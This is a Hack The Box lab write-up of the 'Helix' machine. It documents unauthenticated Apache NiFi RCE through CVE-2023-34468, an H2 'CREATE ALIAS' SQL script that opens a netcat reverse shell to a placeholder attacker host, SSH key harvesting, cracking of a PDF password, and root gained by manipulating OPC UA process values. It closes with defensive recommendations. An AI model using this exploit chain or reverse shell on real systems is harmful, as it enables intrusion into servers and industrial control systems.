---
title: "Helix — Unauthenticated NiFi RCE, a Recovered Operator Key, and OPC UA Maintenance-Window Root"
seoTitle: "Helix — Unauthenticated NiFi RCE and OPC UA Maintenance-Window Root"
description: "Unauthenticated Apache NiFi command execution through CVE-2023-34468 and an H2 database driver, a recovered operator SSH key, and a cracked operations guide open an OPC UA maintenance window that grants root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - apache-nifi
  - cve
  - opc-ua
objective: "Escalate from an unauthenticated Apache NiFi workflow service to root by abusing CVE-2023-34468, a recovered operator key, and a control-system maintenance window."
tools:
  - rustscan
  - nmap
  - gobuster
  - python3
  - netcat
  - ssh
  - scp
  - john
  - opcua-client
  - sudo
skill: "Unauthenticated workflow-service exploitation and control-system privilege escalation"
outcome: "Command execution as the NiFi service account, operator SSH access from a recovered backup key, and a time-limited root session via an OPC UA maintenance window"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Ubuntu Linux; nginx 1.18.0 exposing an Apache NiFi 1.21.0 workflow service on a virtual host |
| Starting position | Unauthenticated network access |
| Objective | Escalate from an unauthenticated Apache NiFi workflow service to root by abusing CVE-2023-34468, a recovered operator key, and a control-system maintenance window |
| Outcome | NiFi service-account command execution; operator SSH access; time-limited root via a privileged maintenance console |

## NiFi RCE to OPC UA maintenance root

Helix is a Medium-rated Hack The Box Linux lab in which an unauthenticated Apache NiFi instance on a virtual host is abused through CVE-2023-34468 (an H2-backed `DBCPConnectionPool` driving an `ExecuteSQL` processor that runs a remote SQL script) to gain command execution as the NiFi service account. Local file search recovers a backup operator SSH key, the operator home directory exposes an internal OPC UA control service and a password-protected operations guide, and the guide's process conditions open a maintenance window in which a privileged maintenance console grants temporary root. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Unauthenticated Apache NiFi on `flow.<TARGET_HOSTNAME>` → CVE-2023-34468 H2 `RUNSCRIPT` command execution as the NiFi service account → backup operator SSH key in a NiFi support bundle → operator SSH access → control-system diagram and cracked operations guide identifying an internal OPC UA service and its unlock conditions → OPC UA maintenance window → privileged maintenance console root**

## Ubuntu host, hostname-gated NiFi, unauthenticated, maintenance root

- **Target:** an Ubuntu Linux host exposing SSH (OpenSSH 8.9p1) and HTTP (nginx 1.18.0).
- **Exposed services:** HTTP redirects to a hostname rather than an IP, so host-based virtual-host enumeration is required before the web tier is reachable.
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** gain initial access through the NiFi service, enumerate the host for escalation material, and reach root by satisfying the control-system conditions that unlock privileged maintenance access.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: NiFi H2 execution to OPC UA maintenance window

### 1. Service enumeration and virtual-host discovery

Observation: a full TCP scan exposes only SSH and HTTP.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <OUT_FILE>
```

```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Significance: HTTP is the only externally reachable application surface, and the redirect behavior means the site must be reached by hostname, so virtual-host fuzzing was used:

```bash
gobuster vhost \
  --url http://<TARGET_HOSTNAME> \
  --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

```text
flow.<TARGET_HOSTNAME> Status: 200 [Size: 1068]
```

Result: the `flow.<TARGET_HOSTNAME>` virtual host serves an unauthenticated Apache NiFi 1.21.0 instance, a version affected by CVE-2023-34468.

### 2. Command execution through NiFi CVE-2023-34468

Observation: NiFi 1.21.0 is affected by CVE-2023-34468, which lets an H2 database driver execute SQL from a URL through a controller service.

Action: a `DBCPConnectionPool` controller service was configured with the H2 driver, and an `ExecuteSQL` processor was pointed at a hosted SQL script.

```text
DBCPConnectionPool controller service
  Database Connection URL    : jdbc:h2:mem:<DB_NAME>;TRACE_LEVEL_SYSTEM_OUT=3;
  Database Driver Class Name : org.h2.Driver
  Database Driver Location   : <NIFI_LIB_DIR>/h2-<VERSION>.jar

ExecuteSQL processor
  SQL select query           : RUNSCRIPT FROM 'http://<ATTACKER_HOST>:<HTTP_PORT>/<SCRIPT_NAME>.sql'
```

The hosted script defines a Java alias that launches a reverse shell (placeholder pattern, not a literal payload):

```sql
CREATE ALIAS SHELLEXEC AS $$
String shellexec(String cmd) throws java.io.IOException {
    new ProcessBuilder("bash", "-c", cmd).redirectErrorStream(true).start();
    return "started";
}
$$;

CALL SHELLEXEC('nc -c bash <ATTACKER_HOST> <SHELL_PORT>');
```

Serving the script and catching the callback:

```bash
python3 -m http.server <HTTP_PORT>
nc -nlvp <SHELL_PORT>
```

The command runs in the NiFi service context:

```text
uid=998(<NIFI_SERVICE_ACCOUNT>) gid=998(<NIFI_SERVICE_ACCOUNT>) groups=998(<NIFI_SERVICE_ACCOUNT>)
```

Significance: the H2 `CREATE ALIAS` feature lets a SQL expression invoke arbitrary Java, so an unauthenticated workflow configuration becomes host command execution under the account running NiFi.

Result: command execution as `<NIFI_SERVICE_ACCOUNT>` is confirmed by the `id` output.

### 3. Backup operator SSH key recovery

Observation: the NiFi configuration stores the sensitive-properties key. I tried a filesystem search for key material and located a backup operator private key.

```text
nifi.sensitive.props.key=<NIFI_SENSITIVE_PROPS_KEY>
nifi.sensitive.props.algorithm=NIFI_PBKDF2_AES_GCM_256
```

```bash
find / -type f \( \
  -name "*id_rsa*" -o \
  -name "*id_ed25519*" -o \
  -name "*id_ecdsa*" -o \
  -name "*.pem*" -o \
  -name "*.key*" \
\) 2>/dev/null
```

```text
<NIFI_SUPPORT_DIR>/<OPERATOR_ACCOUNT>_id_ed25519.bak
```

The recovered backup key is copied locally and used as `<SSH_KEY>`:

```bash
ssh -i <SSH_KEY> <OPERATOR_ACCOUNT>@<TARGET_HOSTNAME>
```

Significance: service support bundles can carry high-impact artifacts, so a service-level compromise can become an interactive user account. The source records that the recovered backup key authenticated an SSH session as `<OPERATOR_ACCOUNT>`; no terminal excerpt of that login is retained, so that login was not reproduced.

Result: interactive SSH access to the operator account provides a stable work context.

### 4. Operator files and the operations guide

Observation: the operator home directory holds a control-system diagram and a password-protected operations guide.

```bash
scp -i <SSH_KEY> \
  '<OPERATOR_ACCOUNT>@<TARGET_HOSTNAME>:<CONTROL_DIAGRAM>' \
  '<OPERATOR_ACCOUNT>@<TARGET_HOSTNAME>:<OPS_GUIDE_PDF>' \
  .
```

The diagram identifies an internal OPC UA service:

```text
opc.tcp://127.0.0.1:4840/helix
```

The guide's password is recovered from its hash:

```bash
pdf2john '<OPS_GUIDE_PDF>' > <HASH_FILE>
john <HASH_FILE> --format=PDF --wordlist=<WORDLIST>
```

Recovered password: `<PDF_PASSWORD>`.

The unlocked guide states the maintenance-window requirements:

```text
1. Switch Mode to MAINTENANCE
2. Enable TestOverride
3. Begin controlled adjustment using CalibrationOffset
Maintenance window opens when temperature reaches approximately 295 C or pressure reaches 73 bar
```

Significance: operational documentation is part of the escalation path: it names the internal control service and the exact process state required to unlock privileged access.

Result: the guide's process conditions and the internal OPC UA endpoint are recovered.

### 5. OPC UA maintenance window and privileged console

Observation: the internal OPC UA service is reachable only on loopback and enforces the maintenance conditions described in the guide.

Action: the port was forwarded over the existing SSH session and driven with an OPC UA client.

```bash
ssh -L 4840:localhost:4840 <OPERATOR_ACCOUNT>@<TARGET_HOSTNAME> -i <SSH_KEY>
opcua-client
```

Following the guide, the mode was set to `MAINTENANCE`, `TestOverride` was enabled, and `CalibrationOffset` was increased until the required temperature was reached:

```text
offset=11.0 temp=295.35
```

With the window open, the permitted command yields a privileged, short-lived session:

```bash
sudo /usr/local/sbin/helix-maint-console
```

```text
[+] Privileged maintenance access granted
[!] Window expires in 100 seconds
<PRIVILEGED_ACCOUNT>@<TARGET_HOSTNAME>:/home/<OPERATOR_ACCOUNT>#
```

Significance: a privileged wrapper gated only by a manipulable process condition grants an interactive root shell; the time limit bounds but does not remove the impact.

Result: a root-context session is obtained and expires after 100 seconds.

## Obstacle: support-bundle search after failed decryption

| Challenge | Decision | Rationale |
|---|---|---|
| NiFi sensitive-properties key did not immediately yield a credential | Continued with a filesystem search for key material | The flow-decryption route produced no credential; the support-bundle search instead recovered a backup operator SSH key |

## Outcome: operator SSH and a time-limited root session

The recorded path includes service-account command execution, operator SSH access from a recovered backup key, and a time-limited root context; the root session expires after 100 seconds.

## Recommendations: NiFi auth, H2 driver, bundle keys, docs, wrapper

The case documents the exposures described here, while the recommended controls remain untested.

1. **Unauthenticated NiFi administration.** An unauthenticated workflow service let an external party configure controller services and processors. *Recommendation:* require authentication on NiFi, restrict who can create controller services and processors, and avoid exposing the administration interface beyond trusted networks. *Detection:* monitor new or modified controller services, processors, and database connection pools.
2. **CVE-2023-34468 (dynamic H2 driver and `RUNSCRIPT`).** A supported H2 driver combined with an `ExecuteSQL` processor turned a SQL configuration into host command execution. *Recommendation:* patch NiFi to a fixed release and restrict scriptable database features and driver loading to trusted administrators. *Detection:* audit flow configuration for `RUNSCRIPT` usage and untrusted driver locations.
3. **Credentials in NiFi support bundles.** A backup operator private key was recoverable from a support-bundle directory. *Recommendation:* exclude secret material from support bundles, scan them before sharing, and rotate any key that may have been exposed. *Detection:* monitor the support-bundle directory for unexpected key or credential files.
4. **Sensitive operational documentation and an exposed control service.** A protected-but-crackable operations guide and diagram disclosed the internal OPC UA endpoint and its unlock conditions. *Recommendation:* keep control-system documentation off general user hosts, store it encrypted with strong passphrases, and segment OPC UA services so they are not reachable from ordinary accounts. *Detection:* flag unexpected connections to the OPC UA port.
5. **Time-limited privileged wrapper.** A permitted command gated by a manipulable process condition granted an interactive root shell. *Recommendation:* scope privileged wrappers to specific, non-interactive operations, remove direct root-shell access from them, and require stronger authorization than a process value. *Detection:* review `sudoers` for wrappers that spawn privileged shells.

## References

- [Hack The Box — Helix](https://app.hackthebox.com/machines/Helix) (retired machine)
- [NVD — CVE-2023-34468](https://nvd.nist.gov/vuln/detail/CVE-2023-34468) (Apache NiFi remote code execution through the H2 database driver)
- [Apache NiFi Security — CVE-2023-34468](https://nifi.apache.org/security.html#CVE-2023-34468) (vendor advisory)
- [Gobuster](https://github.com/OJ/gobuster) (directory, DNS, and virtual-host discovery)
- [RustScan](https://github.com/RustScan/RustScan) (port scanner)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [John the Ripper](https://www.openwall.com/john/) (password-cracking suite, including `pdf2john`)
- [FreeOpcUa opcua-client](https://github.com/FreeOpcUa/opcua-client-gui) (OPC UA client)
